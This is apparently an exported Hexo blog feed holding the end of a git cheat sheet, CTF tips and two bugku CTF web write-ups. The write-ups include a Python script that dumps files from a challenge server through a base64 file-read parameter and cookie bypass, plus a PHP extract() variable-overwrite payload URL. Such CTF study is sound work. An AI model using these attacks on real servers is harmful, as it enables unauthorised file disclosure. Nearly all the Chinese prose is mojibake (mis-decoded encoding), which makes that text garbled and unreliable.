æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶ç›¸å…³çš„æ¯ä¸€æ¬¡diff</span><br><span class="line">git log -p [file]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºè¿‡å»5æ¬¡æäº¤</span><br><span class="line">git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæ‰€æœ‰æäº¤è¿‡çš„ç”¨æˆ·ï¼ŒæŒ‰æäº¤æ¬¡æ•°æ’åº</span><br><span class="line">git shortlog -sn</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶æ˜¯ä»€ä¹ˆäººåœ¨ä»€ä¹ˆæ—¶é—´ä¿®æ”¹è¿‡</span><br><span class="line">git blame [file]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å·®å¼‚</span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæš‚å­˜åŒºå’Œä¸Šä¸€ä¸ªcommitçš„å·®å¼‚</span><br><span class="line">git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºå·¥ä½œåŒºä¸å½“å‰åˆ†æ”¯æœ€æ–°commitä¹‹é—´çš„å·®å¼‚</span><br><span class="line">git diff HEAD</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºä¸¤æ¬¡æäº¤ä¹‹é—´çš„å·®å¼‚</span><br><span class="line">git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºä»Šå¤©ä½ å†™äº†å¤šå°‘è¡Œä»£ç </span><br><span class="line">git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸæ¬¡æäº¤çš„å…ƒæ•°æ®å’Œå†…å®¹å˜åŒ–</span><br><span class="line">git show [commit]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸæ¬¡æäº¤å‘ç”Ÿå˜åŒ–çš„æ–‡ä»¶</span><br><span class="line">git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸæ¬¡æäº¤æ—¶ï¼ŒæŸä¸ªæ–‡ä»¶çš„å†…å®¹</span><br><span class="line">git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„æœ€è¿‘å‡ æ¬¡æäº¤</span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure>
<h2 id="å…«ã€è¿œç¨‹åŒæ­¥"><a href="#å…«ã€è¿œç¨‹åŒæ­¥" class="headerlink" title="å…«ã€è¿œç¨‹åŒæ­¥"></a>å…«ã€è¿œç¨‹åŒæ­¥</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä¸‹è½½è¿œç¨‹ä»“åº“çš„æ‰€æœ‰å˜åŠ¨</span><br><span class="line">git fetch [remote]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæ‰€æœ‰è¿œç¨‹ä»“åº“</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸä¸ªè¿œç¨‹ä»“åº“çš„ä¿¡æ¯</span><br><span class="line">git remote show [remote]</span><br><span class="line"></span><br><span class="line"># å¢åŠ ä¸€ä¸ªæ–°çš„è¿œç¨‹ä»“åº“ï¼Œå¹¶å‘½å</span><br><span class="line">git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"># å–å›è¿œç¨‹ä»“åº“çš„å˜åŒ–ï¼Œå¹¶ä¸æœ¬åœ°åˆ†æ”¯åˆå¹¶</span><br><span class="line">git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"># ä¸Šä¼ æœ¬åœ°æŒ‡å®šåˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“</span><br><span class="line">git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"># å¼ºè¡Œæ¨é€å½“å‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“ï¼Œå³ä½¿æœ‰å†²çª</span><br><span class="line">git push [remote] --force</span><br><span class="line"></span><br><span class="line"># æ¨é€æ‰€æœ‰åˆ†æ”¯åˆ°è¿œç¨‹ä»“åº“</span><br><span class="line">git push [remote] --all</span><br></pre></td></tr></table></figure>
<h2 id="ä¹ã€æ’¤é”€"><a href="#ä¹ã€æ’¤é”€" class="headerlink" title="ä¹ã€æ’¤é”€"></a>ä¹ã€æ’¤é”€</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ¢å¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°å·¥ä½œåŒº</span><br><span class="line">git checkout [file]</span><br><span class="line"></span><br><span class="line"># æ¢å¤æŸä¸ªcommitçš„æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒºå’Œå·¥ä½œåŒº</span><br><span class="line">git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"># æ¢å¤æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶åˆ°å·¥ä½œåŒº</span><br><span class="line">git checkout .</span><br><span class="line"></span><br><span class="line"># é‡ç½®æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶ï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´ï¼Œä½†å·¥ä½œåŒºä¸å˜</span><br><span class="line">git reset [file]</span><br><span class="line"></span><br><span class="line"># é‡ç½®æš‚å­˜åŒºä¸å·¥ä½œåŒºï¼Œä¸ä¸Šä¸€æ¬¡commitä¿æŒä¸€è‡´</span><br><span class="line">git reset --hard</span><br><span class="line"></span><br><span class="line"># é‡ç½®å½“å‰åˆ†æ”¯çš„æŒ‡é’ˆä¸ºæŒ‡å®šcommitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºï¼Œä½†å·¥ä½œåŒºä¸å˜</span><br><span class="line">git reset [commit]</span><br><span class="line"></span><br><span class="line"># é‡ç½®å½“å‰åˆ†æ”¯çš„HEADä¸ºæŒ‡å®šcommitï¼ŒåŒæ—¶é‡ç½®æš‚å­˜åŒºå’Œå·¥ä½œåŒºï¼Œä¸æŒ‡å®šcommitä¸€è‡´</span><br><span class="line">git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"># é‡ç½®å½“å‰HEADä¸ºæŒ‡å®šcommitï¼Œä½†ä¿æŒæš‚å­˜åŒºå’Œå·¥ä½œåŒºä¸å˜</span><br><span class="line">git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªcommitï¼Œç”¨æ¥æ’¤é”€æŒ‡å®šcommit</span><br><span class="line"># åè€…çš„æ‰€æœ‰å˜åŒ–éƒ½å°†è¢«å‰è€…æŠµæ¶ˆï¼Œå¹¶ä¸”åº”ç”¨åˆ°å½“å‰åˆ†æ”¯</span><br><span class="line">git revert [commit]</span><br><span class="line"></span><br><span class="line"># æš‚æ—¶å°†æœªæäº¤çš„å˜åŒ–ç§»é™¤ï¼Œç¨åå†ç§»å…¥</span><br><span class="line">git stash</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure>
<h2 id="åã€å…¶ä»–"><a href="#åã€å…¶ä»–" class="headerlink" title="åã€å…¶ä»–"></a>åã€å…¶ä»–</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ç”Ÿæˆä¸€ä¸ªå¯ä¾›å‘å¸ƒçš„å‹ç¼©åŒ…</span><br><span class="line">git archive</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF_note</title>
    <url>/2019/07/16/CTF/ctf%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>é¢˜ç›®hintå¾ˆé‡è¦ï¼Œå†çœ‹htmlå…ƒç´ å’Œjsæœ‰æ— æç¤ºï¼Œæ ¹æ®ç½‘ç«™æ“ä½œæ¼”ç»ƒä¸€éï¼Œå‘ç°é¡µé¢å›æ˜¾å’Œå¯ç–‘ä¹‹å¤„ã€‚</p>
<a id="more"></a>

<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>çœ‹å¤´å’Œè¡¨å•æ•°æ®ã€‚</p>
<h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>çœ‹robots.txt</p>
<h2 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h2><p>æ‰«æŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘ä¹‹å¤„ã€‚</p>
<h2 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h2><h3 id="å¸¸è§æ¼æ´æ€»ç»“ï¼š"><a href="#å¸¸è§æ¼æ´æ€»ç»“ï¼š" class="headerlink" title="å¸¸è§æ¼æ´æ€»ç»“ï¼š"></a>å¸¸è§æ¼æ´æ€»ç»“ï¼š</h3><p> 1.æ–‡ä»¶åŒ…å«æ¼æ´ â€¦/./è¿›è¡Œè·¨ç›®å½•</p>
<p> 2.md5ç¢°æ’ï¼Œbase64åŠ å¯†ï¼Œ==åˆ¤æ–­ä¼ æ•°ç»„</p>
<p> 3.cookieså‚æ•°ï¼ŒseesionIDä¿è¯æ•°æ®ä¸åˆ·æ–°</p>
<p> 4.Referå’ŒX-Forwardè¦æ±‚æœ¬åœ°</p>
<h1 id="mirc"><a href="#mirc" class="headerlink" title="mirc"></a>mirc</h1><h2 id="1-æ–‡ä»¶éšå†™"><a href="#1-æ–‡ä»¶éšå†™" class="headerlink" title="1.æ–‡ä»¶éšå†™"></a>1.æ–‡ä»¶éšå†™</h2><p> 1.æ–‡ä»¶åŒ…å«ï¼ŒjpgåŒ…å«zipï¼ŒdocxåŒ…å«zipã€‚æ³¨æ„æŸ¥çœ‹documentæ–‡ä»¶å¤¹å’Œç›®å½•ä¸‹documentæ–‡ä»¶ã€‚</p>
<p> 2.æ–‡ä»¶å¤´ï¼Œgifï¼Œpngï¼Œexifï¼Œjiffæ ¼å¼æŸåå¤åŸã€‚</p>
<p> 3.æ–‡ä»¶å°¾æ•°æ®å¯ç–‘%urlç¼–ç ï¼Œå¤§å°å†™å­—æ¯baseç¼–ç ï¼Œæ•°å­—è½¬æ¢è¿›åˆ¶ã€‚</p>
<p> 4.æ–‡ä»¶å±æ€§éšè—å¯†ç å’Œæ•°æ®ã€‚</p>
<p> 5.mp3æ–‡ä»¶éšè—æ•°æ®ï¼Œå¯†ç å¦‚3.4.æŸ¥è¯¢</p>
<p> 6.äºŒç»´ç åè½¬ï¼Œå›¾ç‰‡è¿‡æ»¤è‰²å·®ã€‚</p>
<p> 7.å›¾ç‰‡æ˜¾ç¤ºä¸å…¨ï¼Œä¸€æ¬ä¸ºpngï¼Œæ›´æ”¹å®½åº¦å’Œé«˜åº¦ä¸€è‡´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.zipå¯†ç çˆ†ç ´</span><br></pre></td></tr></table></figure>
<p> 9.ddåˆ†ç¦»æ–‡ä»¶ï¼Œå‚æ•°è¯´æ˜:ã€</p>
<p> if inputfile è¾“å…¥æ–‡ä»¶</p>
<p> of outputfile è¾“å‡ºæ–‡ä»¶</p>
<p> skip è·³è¿‡å¤šå°‘å­—èŠ‚åˆ†ç¦»</p>
<p> ibs è¯»å–æ–‡ä»¶é€Ÿç‡</p>
<p> obs è¾“å‡ºæ–‡ä»¶é€Ÿç‡</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_web11</title>
    <url>/2019/07/16/CTF_WP/bugku_web11/</url>
    <content><![CDATA[<h1 id="bugku-web11"><a href="#bugku-web11" class="headerlink" title="bugku_web11"></a>bugku_web11</h1><h2 id="é¢˜ç›®åœ°å€ï¼š"><a href="#é¢˜ç›®åœ°å€ï¼š" class="headerlink" title="é¢˜ç›®åœ°å€ï¼š"></a>é¢˜ç›®åœ°å€ï¼š</h2><p><a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>
<p>å¤‡æ³¨ï¼šæˆ‘ç”¨çš„æ˜¯python3</p>
<a id="more"></a>

<h2 id="filename-a2V5cy50eHQ"><a href="#filename-a2V5cy50eHQ" class="headerlink" title="filename=a2V5cy50eHQ="></a>filename=a2V5cy50eHQ=</h2><p>æ–‡ä»¶åŒ…å«</p>
<p>å› ä¸ºfilenameä¸€èˆ¬è¯´æ˜æºä»£ç ä¸­æœ‰è¯»å–æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°</p>
<p>ä»ä¸‹é¢æºç ä¸­å¯çŸ¥çš„ç¡®å«æœ‰å‡½æ•°file()</p>
<h2 id="base64æ ¼å¼"><a href="#base64æ ¼å¼" class="headerlink" title="base64æ ¼å¼"></a>base64æ ¼å¼</h2><p>å¤§å°å†™å­—æ¯+=/</p>
<h1 id="line"><a href="#line" class="headerlink" title="line="></a>line=</h1><p>å¯èƒ½ä¸è¯»å–è¡Œæ•°æœ‰å…³</p>
<h1 id="phpå‡½æ•°"><a href="#phpå‡½æ•°" class="headerlink" title="phpå‡½æ•°"></a>phpå‡½æ•°</h1><p>isset()åˆ¤æ–­æ˜¯éè®¾ç½®å€¼</p>
<p>header urlé‡å®šå‘</p>
<p>in_array ç¬¬ä¸€ä¸ªæ˜¯åŒ¹é…å­—ç¬¦ï¼Œç¬¬äºŒä¸ªæ˜¯æ•°ç»„</p>
<p>file è¯»å–æ–‡ä»¶æ¯ä¸€è¡Œ</p>
<h2 id="å°è¯•æ–‡ä»¶è¯»å–çš„æ­¥éª¤"><a href="#å°è¯•æ–‡ä»¶è¯»å–çš„æ­¥éª¤" class="headerlink" title="å°è¯•æ–‡ä»¶è¯»å–çš„æ­¥éª¤"></a>å°è¯•æ–‡ä»¶è¯»å–çš„æ­¥éª¤</h2><p>cookies é‡Œé¢è¦æœ‰å€¼</p>
<p>margin=margin</p>
<p>filename =keys.php</p>
<p>keys.phpè¦base64åŠ å¯†a2V5cy5waHA=</p>
<p>è·å–çš„index.phpçš„æºç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file &#x3D; base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line"></span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line"></span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line"></span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line"></span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line"></span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">&#39;2&#39;&#x3D;&gt; &#39;keys.php&#39;</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line"></span><br><span class="line">echo $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">import requests</span><br><span class="line">for a in range(0,100):</span><br><span class="line">    index_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39;</span><br><span class="line">    session &#x3D; requests.session()</span><br><span class="line">    index &#x3D; session.get(index_url)</span><br><span class="line">    if index.text!&#x3D;&quot;&quot;:</span><br><span class="line">        print(index.text)</span><br><span class="line">    else:</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">for a in range(0,100):</span><br><span class="line">    flag_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;a2V5cy5waHA&#x3D;&#39;</span><br><span class="line">    cook &#x3D; &#123;</span><br><span class="line">        &#39;margin&#39;:&#39;margin&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    flag &#x3D; session.get(flag_url,cookies&#x3D;cook)</span><br><span class="line">    if flag.text!&#x3D;&quot;&quot;:</span><br><span class="line">        print(flag.text)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<h1 id="key-â€™KEY-key-keys"><a href="#key-â€™KEY-key-keys" class="headerlink" title="key=â€™KEY{key_keys}"></a>key=â€™KEY{key_keys}</h1><h1 id="è§£é¢˜æ­¥éª¤æ€»ç»“"><a href="#è§£é¢˜æ­¥éª¤æ€»ç»“" class="headerlink" title="è§£é¢˜æ­¥éª¤æ€»ç»“"></a>è§£é¢˜æ­¥éª¤æ€»ç»“</h1><h2 id="1-ä¹±ç è¯•ç€è§£ç "><a href="#1-ä¹±ç è¯•ç€è§£ç " class="headerlink" title="1.ä¹±ç è¯•ç€è§£ç "></a>1.ä¹±ç è¯•ç€è§£ç </h2><h2 id="2-urlä¸­çš„filenameå°è¯•æ–‡ä»¶åŒ…å«"><a href="#2-urlä¸­çš„filenameå°è¯•æ–‡ä»¶åŒ…å«" class="headerlink" title="2.urlä¸­çš„filenameå°è¯•æ–‡ä»¶åŒ…å«"></a>2.urlä¸­çš„filenameå°è¯•æ–‡ä»¶åŒ…å«</h2><h2 id="3-ç¼–å†™è„šæœ¬"><a href="#3-ç¼–å†™è„šæœ¬" class="headerlink" title="3.ç¼–å†™è„šæœ¬"></a>3.ç¼–å†™è„šæœ¬</h2><h2 id="4-ä»£ç å®¡è®¡"><a href="#4-ä»£ç å®¡è®¡" class="headerlink" title="4.ä»£ç å®¡è®¡"></a>4.ä»£ç å®¡è®¡</h2><h2 id="5-cookieæ»¡è¶³è¦æ±‚"><a href="#5-cookieæ»¡è¶³è¦æ±‚" class="headerlink" title="5.cookieæ»¡è¶³è¦æ±‚"></a>5.cookieæ»¡è¶³è¦æ±‚</h2><h2 id="6-ç»§ç»­è„šæœ¬å‘é€è·å–key"><a href="#6-ç»§ç»­è„šæœ¬å‘é€è·å–key" class="headerlink" title="6.ç»§ç»­è„šæœ¬å‘é€è·å–key"></a>6.ç»§ç»­è„šæœ¬å‘é€è·å–key</h2><h1 id="é¢˜ç›®æ‰€éœ€åŸºç¡€çŸ¥è¯†"><a href="#é¢˜ç›®æ‰€éœ€åŸºç¡€çŸ¥è¯†" class="headerlink" title="é¢˜ç›®æ‰€éœ€åŸºç¡€çŸ¥è¯†"></a>é¢˜ç›®æ‰€éœ€åŸºç¡€çŸ¥è¯†</h1><h4 id="phpåŸºç¡€è¯­æ³•-å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥-ä¸æ€¥"><a href="#phpåŸºç¡€è¯­æ³•-å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥-ä¸æ€¥" class="headerlink" title="phpåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥"></a>phpåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥</h4><h4 id="pythonåŸºç¡€è¯­æ³•-å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥-ä¸æ€¥"><a href="#pythonåŸºç¡€è¯­æ³•-å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥-ä¸æ€¥" class="headerlink" title="pythonåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥"></a>pythonåŸºç¡€è¯­æ³•,å‡½æ•°çœ‹ä¸æ‡‚å¯ä»¥æŸ¥,ä¸æ€¥</h4><h4 id="requestsåº“åŸºæœ¬æ“ä½œ"><a href="#requestsåº“åŸºæœ¬æ“ä½œ" class="headerlink" title="requestsåº“åŸºæœ¬æ“ä½œ"></a>requestsåº“åŸºæœ¬æ“ä½œ</h4><h4 id="äº†è§£ä¸€ä¸‹è¯´æ˜æ˜¯cookieså’Œsession"><a href="#äº†è§£ä¸€ä¸‹è¯´æ˜æ˜¯cookieså’Œsession" class="headerlink" title="äº†è§£ä¸€ä¸‹è¯´æ˜æ˜¯cookieså’Œsession"></a>äº†è§£ä¸€ä¸‹è¯´æ˜æ˜¯cookieså’Œsession</h4><h4 id="httpçš„responseå’Œrequestï¼Œhead"><a href="#httpçš„responseå’Œrequestï¼Œhead" class="headerlink" title="httpçš„responseå’Œrequestï¼Œhead"></a>httpçš„responseå’Œrequestï¼Œhead</h4><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><p>è§£ç ç½‘ç«™ï¼šæŸä¸ªå¤§ä½¬çš„åšå®¢</p>
<p><a href="https://www.wishingstarmoye.com/">https://www.wishingstarmoye.com/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>bugkuä»£ç å®¡è®¡</title>
    <url>/2019/07/16/CTF_WP/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%B1%BB%E5%88%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93%E5%92%8Cbugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h1 id="bugkuä»£ç å®¡è®¡"><a href="#bugkuä»£ç å®¡è®¡" class="headerlink" title="bugkuä»£ç å®¡è®¡"></a>bugkuä»£ç å®¡è®¡</h1><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä¸€ä¸‹åªæ˜¯ä¸ªäººçš„ä¸€ç‚¹æ‹™è§ï¼Œè¯·å¤§ä½¬è½»å–·ï¼Œæ¬¢è¿å¤§ä½¬è¡¥å……ï¼Œå¾ˆå¤šä¸æ°å½“çš„åœ°æ–¹ã€‚</p>
<a id="more"></a>

<h2 id="0x00-extractå˜é‡è¦†ç›–"><a href="#0x00-extractå˜é‡è¦†ç›–" class="headerlink" title="0x00 extractå˜é‡è¦†ç›–"></a>0x00 extractå˜é‡è¦†ç›–</h2><h3 id="é¢˜ç›®åœ°å€"><a href="#é¢˜ç›®åœ°å€" class="headerlink" title="é¢˜ç›®åœ°å€"></a><a href="http://123.206.87.240:9009/1.php">é¢˜ç›®åœ°å€</a></h3><h3 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">	$content&#x3D;trim(file_get_contents($flag));</span><br><span class="line">	if($shiyan&#x3D;&#x3D;$content)&#123;</span><br><span class="line">		echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo&#39;Oh.no&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeip"><a href="#writeip" class="headerlink" title="writeip"></a>writeip</h3><ol>
<li><p>æ„é€ payload:</p>
<p><a href="http://123.206.87.240:9009/1.php?shjyan=&amp;flag=">http://123.206.87.240:9009/1.php?shjyan=&amp;flag=</a></p>
<p>è¦†ç›–åŸæœ‰çš„flagå˜é‡ï¼Œæ˜¯ç©º==ç©ºæˆç«‹ï¼Œè¾“å‡ºflag</p>
</li>
</ol>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dmsj-p2sm3N}</p>
<h3 id="extractç”¨æ³•"><a href="#extractç”¨æ³•" class="headerlink" title="extractç”¨æ³•"></a>extractç”¨æ³•</h3><p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract â€” ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p>
<h4 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extract ( array &amp;$array [, int $flags &#x3D; EXTR_OVERWRITE [, string $prefix &#x3D; NULL ]] ) : int</span><br></pre></td></tr></table></figure>
<p> æœ¬å‡½æ•°ç”¨æ¥å°†å˜é‡ä»æ•°ç»„ä¸­å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚</p>
<p> æ£€æŸ¥æ¯ä¸ªé”®åçœ‹æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ä¸ªåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²æœ‰çš„å˜é‡åçš„å†²çªã€‚</p>
<h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><ul>
<li><p><code>array</code></p>
<p> ä¸€ä¸ªå…³è”æ•°ç»„ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡ï¼Œå¹¶å—åˆ° <code>flags</code>å’Œ<code>prefix</code>å‚æ•°çš„å½±å“ã€‚å¿…é¡»ä½¿ç”¨å…³è”æ•°ç»„ï¼Œæ•°å­—ç´¢å¼•çš„æ•°ç»„å°†ä¸ä¼šäº§ç”Ÿç»“æœï¼Œé™¤éç”¨äº†<code>EXTR_PREFIX_ALL</code>æˆ–è€…<code>EXTR_PREFIX_INVALID</code>ã€‚</p>
</li>
<li><p><code>flags</code></p>
<p>å¯¹å¾…éæ³•ï¼æ•°å­—å’Œå†²çªçš„é”®åçš„æ–¹æ³•å°†æ ¹æ®å–å‡ºæ ‡è®°<code>flags</code>å‚æ•°å†³å®šã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š</p>
<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>EXTR_OVERWRITE</code></td>
<td align="left">å¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_SKIP</code></td>
<td align="left">å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_SAME</code></td>
<td align="left">å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <code>prefix</code>ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_ALL</code></td>
<td align="left">ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€<code>prefix</code>ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_INVALID</code></td>
<td align="left">ä»…åœ¨éæ³•ï¼æ•°å­—çš„å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <code>prefix</code>ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_IF_EXISTS</code></td>
<td align="left">ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä»¥ä¸‹æƒ…å†µéå¸¸æœ‰ç”¨ï¼šå®šä¹‰ä¸€äº›æœ‰æ•ˆå˜é‡ï¼Œç„¶åä» <code>$_REQUEST</code> ä¸­ä»…å¯¼å…¥è¿™äº›å·²å®šä¹‰çš„å˜é‡ã€‚</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_IF_EXISTS</code></td>
